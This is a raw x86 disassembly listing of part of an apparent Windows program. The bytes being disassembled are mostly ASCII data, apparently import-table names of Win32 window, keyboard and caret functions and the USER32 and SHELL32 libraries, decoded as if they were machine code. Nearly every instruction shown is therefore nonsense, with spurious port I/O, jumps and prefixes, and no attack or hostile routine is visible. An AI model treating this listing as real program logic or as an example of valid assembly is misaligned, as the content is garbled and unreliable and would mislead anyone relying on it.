  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
